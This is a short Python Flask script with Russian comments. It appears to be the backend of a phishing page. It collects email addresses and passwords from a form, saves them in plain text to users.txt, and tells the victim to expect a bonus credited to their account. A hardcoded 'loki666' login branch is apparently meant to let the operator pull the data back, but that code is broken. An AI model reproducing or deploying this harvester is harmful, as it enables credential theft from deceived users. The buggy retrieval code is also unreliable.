
from flask import Flask, render_template, request
import hashlib
 
app = Flask(__name__)
 
# Главная страница
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        
#________________________________________________________ присылает мне все данные о моем пароле и логине
        if email == "loki666@gmail.ru" and password == "loki666":
            with open("users.txt", "r", encoding="utf-8") as file:
                file.read (f"{email}:{password}\n").__str__
            return (f"{email}:{password}\n")
        else:
            
#________________________________________________________
 
        
        # Сохраняем введённые данные в users.txt
            with open("users.txt", "a", encoding="utf-8") as file:
                file.write(f"{email}:{password}\n")
 
        return "✅ Данные успешно сохранены. Ожидайте зачисления бонуса на ваш аккаунт!"
        
    return render_template("index.html")
    
 
# Хэширование всех паролей из users.txt → hashed_users.txt
@app.route("/hash", methods=["GET"])
def hash_passwords():
    try:
        with open("users.txt", "r", encoding="utf-8") as infile, \
             open("hashed_users.txt", "w", encoding="utf-8") as outfile:
            for line in infile:
                email, password = line.strip().split(":")
                hashed = hashlib.sha256(password.encode()).hexdigest()
                outfile.write(f"{email}:{hashed}\n")
        return "🔒 Все пароли успешно хэшированы!"
    except FileNotFoundError:
        return "❌ Файл users.txt не найден!"
    except Exception as e:
        return f"Ошибка: {e}"
 
if __name__ == "__main__":
    app.run(debug=True)